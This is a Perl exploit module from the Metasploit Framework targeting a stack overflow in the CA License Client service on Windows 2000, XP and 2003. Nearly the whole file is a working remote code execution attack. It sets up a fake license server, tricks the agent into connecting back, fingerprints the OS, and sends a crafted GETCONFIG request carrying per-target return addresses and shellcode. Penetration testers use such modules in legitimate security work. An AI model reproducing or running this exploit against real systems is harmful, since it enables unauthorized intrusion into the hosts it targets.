##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::calicclnt_getconfig;
use base "Msf::Exploit";
use strict;
use Pex::Text;

use IO::Socket;
use IO::Select;

my $advanced = { };

my $info =
{
'Name' => 'CA License Client GETCONFIG Overflow',
'Version' => '$Revision: 1.7 $',
'Authors' => [ 'Thor Doomen <syscall [at] hushmail.com>' ],
'Arch' => [ 'x86' ],
'OS' => [ 'win32', 'win2000', 'winxp', 'win2003' ],
'Priv' => 1,
'AutoOpts' => { 'EXITFUNC' => 'process' }, # avoid the ugly pop-up
'UserOpts' => {
'RHOST' => [1, 'ADDR', 'The target address'],
'RPORT' => [1, 'PORT', 'The target port', 10203],
},

'Payload' =>
{
'Space' => 600,
'BadChars' => "\x00\x20",
'Prepend' => "\x81\xc4\x54\xf2\xff\xff",
'Keys' => ['+ws2ord'],
},
'Description' => Pex::Text::Freeform(qq{
This module exploits an vulnerability in the CA License Client
service. This exploit will only work if your IP address will 
resolve to the target system. This can be accomplished on a local
network by running the 'nmbd' service that comes with Samba. If
you are running this exploit from Windows and do not filter udp
port 137, this should not be a problem (if the target is on the same
network segment). Due to the bugginess of the software, you are
only allowed one connection to the agent port before it starts
ignoring you. If it wasn't for this issue, it would be possible to
repeatedly exploit this bug.

}),

'Refs' =>
[
['BID', '12705'],
['CVE', '005-0581'],
['URL', 'http://www.idefense.com/application/poi/display?id=213&type=vulnerabilities'],
],

'Targets' => [

# As much as I would like to return back to the DLL or EXE,
# all of those modules have a leading NULL in the
# loaded @ address :(

['Automatic', 0],
['Windows 2000 English', 0x750217ae, 0x7ffde0cc], # ws2help.dll esi + peb
['Windows XP English SP0-1', 0x71aa16e5, 0x7ffde0cc], # ws2help.dll esi + peb
['Windows XP English SP2', 0x71aa1b22, 0x71aa5001], # ws2help.dll esi + .data
['Windows 2003 English SP0', 0x71bf175f, 0x7ffde0cc], # ws2help.dll esi + peb
],
'Keys' => ['calicense'],
};

sub new {
my $class = shift;
my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
return($self);
}

sub Exploit {
my $self = shift;
my $target_host = $self->GetVar('RHOST');
my $target_port = $self->GetVar('RPORT');
my $target_idx = $self->GetVar('TARGET');
my $shellcode = $self->GetVar('EncodedPayload')->Payload;
my $target = $self->Targets->[$target_idx];

my $server = IO::Socket::INET->new
(
'LocalPort' => 10202,
'Proto' => 'tcp',
'ReuseAddr' => 1,
'Listen' => 5,
'Blocking' => 0,
);

if (! $server) {
$self->PrintLine("[*] Could not start the fake CA License Server: $!");
return;
}
my $sel = IO::Select->new($server);

# 1: Connect to the agent and send a request
my $s = Msf::Socket::Tcp->new
(
'PeerAddr' => $target_host,
'PeerPort' => $target_port,
'LocalPort' => $self->GetVar('CPORT'),
'SSL' => $self->GetVar('SSL'),
);

if ($s->IsError) {
$self->PrintLine("[*] Could not connect to the client agent");
$server->shutdown(2);
$server->close;
return;
}

$s->Send("A0 GETSERVER<EOM>\n");
$self->PrintLine("[*] Waiting for the license agent to connect back...");

my $r = $s->Recv(-1, 3);

# 2: Wait for a connection from the agent back to us
my @ready = $sel->can_read(8);
if (! scalar(@ready)) {
$self->PrintLine("[*] No connection was received from the agent >:(");
$s->Close;
$server->shutdown(2);
$server->close;
return;
}

# 3: Accept the connection and determine target type if needed
my $agent_soc = $ready[0]->accept();
my $agent = Msf::Socket::Tcp->new_from_socket($agent_soc);
$self->PrintLine("[*] Accepted connection from agent ".$agent->PeerAddr);

if ($target_idx == 0) {

$agent->Send("A0 GETCONFIG SELF 0<EOM>");
my $data = $agent->Recv(-1, 2);

if ($data =~ m/OS\<([^\>]+)/) {
my $os = $1;
$os =~ s/_NT//g;
$os =~ s/5\.1/XP/;
$os =~ s/5\.2/2003/;
$os =~ s/5\.0/2000/;
$os =~ s/4\.0/NT 4.0/;

my @targs;
for (1 .. (scalar(@{$self->Targets})-1)) {
if (index($self->Targets->[$_]->[0], $os) != -1) {
push @targs, $_;
}
}

if (scalar(@targs) > 1) {
$self->PrintLine("[*] Multiple possible targets:");
foreach (@targs) {
$self->PrintLine("[*] $_\t".$self->Targets->[$_]->[0]);
}
$self->PrintLine("[*] Picking the closest target and hoping...");
return;
}

if (scalar(@targs)) {
$target = $self->Targets->[$targs[0]];
}

if (! scalar(@targs)) {
$self->PrintLine("[*] No matching target for $os");
return;
}

} else {
$self->PrintLine("[*] Could not determine the remote OS automatically");
return;
}
}

$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

my $boom = Pex::Text::EnglishText(900);

# 144 -> original return address
# 148 -> avoid exception by patching with writable address
# 928 -> seh handler (not useful under XP SP2)

substr($boom, 144, 4, pack('V', $target->[1])); # jmp esi
substr($boom, 148, 4, pack('V', $target->[2])); # writable address
substr($boom, 272, length($shellcode), $shellcode);

my $req = "A0 GETCONFIG SELF $boom<EOM>";

$self->PrintLine("[*] Sending " .length($req) . " bytes to remote host.");
$agent->Send($req);

$server->shutdown(2);
$agent->Close;
$s->Close;

return;
}

1;
